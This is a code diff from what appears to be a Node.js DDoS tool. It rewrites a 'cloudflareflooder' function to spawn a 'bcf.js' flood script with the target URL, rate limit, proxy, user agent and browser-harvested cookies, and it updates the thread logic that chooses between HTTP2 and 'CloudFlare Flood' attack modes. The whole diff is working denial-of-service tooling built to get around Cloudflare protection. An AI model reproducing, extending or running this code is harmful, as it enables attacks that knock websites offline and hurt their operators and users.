@@ -93,24 +93,29 @@ function spawnKittyProcess(url, userAgent, time, cookie, method, thread, proxy, 
 }
 
 
-function cloudflareflooder(url, userAgent, time, cookie, method, thread, proxy) {
+function cloudflareflooder(url, userAgent, time, ratelimit, proxy, cookie) {
 	return new Promise((resolve, reject) => {
-		const args = [url, userAgent, time, cookie, method, thread, proxy];
-		const cloudflareflooder = spawn('./httpddos', args);
-		//const cloudflareflooder = spawn('/opt/glibc-2.34/lib/ld-linux-x86-64.so.2', ['--library-path', '/opt/glibc-2.34/lib', './httpddos', ...args]);
-		cloudflareflooder.stdout.on('data', (data) => {});
+		const args = [url, time, '1', ratelimit, proxy, userAgent, cookie];
+		const cloudflareflooder = spawn('node', ['bcf.js', ...args]);
 
-		cloudflareflooder.stderr.on('data', (data) => {});
+		cloudflareflooder.stdout.on('data', (data) => {
+			console.log(`[stdout] ${data}`);
+		});
+
+		cloudflareflooder.stderr.on('data', (data) => {
+			console.error(`[stderr] ${data}`);
+		});
+
 		cloudflareflooder.on('close', (code) => {
 			if (code === 0) {
 				resolve();
 			} else {
-				reject(new Error(`洪水脚本启动失败请检查是否授予权限或库是否兼容(./httpddos)`));
+				reject(new Error(`Cloudflare Flooder 脚本执行失败，退出码：${code}`));
 			}
 		});
 
 		cloudflareflooder.on('error', (err) => {
-			console.log(`err ${err}`)
+			console.error(`Spawn 错误: ${err}`);
 			reject(err);
 		});
 	});
@@ -1817,7 +1822,7 @@ async function startThread(targetURL, browserProxy, task, done, retries = 0) {
 						await spawnHttp2Process(targetURL, response.userAgent, duration, response.cookies, "GET", rates, response.browserProxy);
 					} else if (iscloudflare || usecloudflaremode) {
 						colored(colors.COLOR_CYAN, "[+] Use CloudFlare Flood");
-						await cloudflareflooder(targetURL, response.userAgent, duration, response.cookies, "GET", rates, response.browserProxy);
+						await cloudflareflooder(targetURL, response.userAgent, duration, rates, response.browserProxy, response.cookies);
 					} else {
 						await spawnHttp2Process(targetURL, response.userAgent, duration, response.cookies, "GET", rates, response.browserProxy);
 					}
